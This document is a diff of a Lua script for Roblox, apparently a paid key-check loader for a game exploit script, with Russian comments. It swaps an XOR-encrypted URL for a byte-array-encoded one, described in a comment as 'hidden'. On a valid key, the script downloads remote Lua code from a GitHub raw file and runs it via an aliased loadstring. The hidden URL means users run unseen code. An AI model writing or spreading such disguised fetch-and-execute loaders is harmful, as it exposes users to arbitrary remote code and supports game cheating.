@@ -29,36 +29,6 @@ if todayKeyTable then
     end
 end
 
--- Функция XOR для расшифровки
-local function xorByte(a, b)
-    local res = 0
-    for i = 0, 7 do
-        local bitA = a % 2
-        local bitB = b % 2
-        local bitR = (bitA ~ bitB) & 1
-        res = res + bitR * 2^i
-        a = math.floor(a / 2)
-        b = math.floor(b / 2)
-    end
-    return res
-end
-
-local function xorDecrypt(data, key)
-    local result = {}
-    for i = 1, #data do
-        local byte = data[i]
-        local keyByte = key:byte((i - 1) % #key + 1)
-        result[i] = string.char(xorByte(byte, keyByte))
-    end
-    return table.concat(result)
-end
-
--- Зашифрованная ссылка
-local encryptedURL = {43,43,51,52,62,103,54,107,61,59,52,58,102,45,51,39,36,38,37,96,43,33,59,39,58,32,55,45,32,55,32,51,59,50,33,53,32,46,51,96,58,34,62,45,56,32,32,51,55,60,45,51,41,51,58,59,38,58,46,34,33,59,60,53,37,32,50,60,37,33,57,56,46,36,33,60,58,33,43,59,53,35,58,32,56,32,32,39,35,51,53,54,56,51,51,38,59,36,37,33,51,37,39,59}
-local key = "mySecretKey"
-
-local scriptURL = xorDecrypt(encryptedURL, key)
-
 -- GUI
 local gui = Instance.new("ScreenGui")
 gui.Name = "PlayerokKeyGui"
@@ -178,35 +148,54 @@ UserInputService.InputChanged:Connect(function(input)
 	end
 end)
 
--- Проверка ключа
+-- Скрытый URL в виде массива байтов
+local urlBytes = {
+    104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,
+    101,114,99,111,110,116,101,110,116,46,99,111,109,47,116,105,101,110,107,104,
+    97,110,104,49,47,115,112,105,99,121,47,109,97,105,110,47,67,104,105,108,108,
+    105,46,108,117,97
+}
+
+local function bytesToString(bytes)
+    local s = {}
+    for i = 1, #bytes do
+        s[i] = string.char(bytes[i])
+    end
+    return table.concat(s)
+end
+
+local hiddenUrl = bytesToString(urlBytes)
+local executor = loadstring
+
+-- Проверка ключа и запуск скрипта с скрытым URL
 button.MouseButton1Click:Connect(function()
-	local input = box.Text:match("^%s*(.-)%s*$")
-	if not validKey then
-		feedback.Text = "⚠️ Ключ на сегодня не найден"
-		feedback.TextColor3 = Color3.fromRGB(255, 170, 0)
-	elseif input == validKey then
-		feedback.Text = "✅ Ключ верный, загружаем..."
-		feedback.TextColor3 = Color3.fromRGB(30, 200, 30)
-		wait(1)
-		gui:Destroy()
-		loadstring(game:HttpGet(scriptURL))()
-	else
-		feedback.Text = "❌ Неверный ключ"
-		feedback.TextColor3 = Color3.fromRGB(200, 40, 40)
-	end
+    local input = box.Text:match("^%s*(.-)%s*$")
+    if not validKey then
+        feedback.Text = "⚠️ Ключ на сегодня не найден"
+        feedback.TextColor3 = Color3.fromRGB(255, 170, 0)
+    elseif input == validKey then
+        feedback.Text = "✅ Ключ верный, загружаем..."
+        feedback.TextColor3 = Color3.fromRGB(30, 200, 30)
+        wait(1)
+        gui:Destroy()
+        executor(game:HttpGet(hiddenUrl))()
+    else
+        feedback.Text = "❌ Неверный ключ"
+        feedback.TextColor3 = Color3.fromRGB(200, 40, 40)
+    end
 end)
 
 -- Получить ключ
 getKeyButton.MouseButton1Click:Connect(function()
-	local link = "https://playerok.com/profile/MILEDI-STORE/products"
-	setclipboard(link)
-	copyFeedback.Text = "Ссылка скопирована"
-	delay(2, function() copyFeedback.Text = "" end)
+    local link = "https://playerok.com/profile/MILEDI-STORE/products"
+    setclipboard(link)
+    copyFeedback.Text = "Ссылка скопирована"
+    delay(2, function() copyFeedback.Text = "" end)
 end)
 
 -- Закрытие по ESC
 UserInputService.InputBegan:Connect(function(input, gpe)
-	if not gpe and input.KeyCode == Enum.KeyCode.Escape then
-		gui:Destroy()
-	end
+    if not gpe and input.KeyCode == Enum.KeyCode.Escape then
+        gui:Destroy()
+    end
 end)
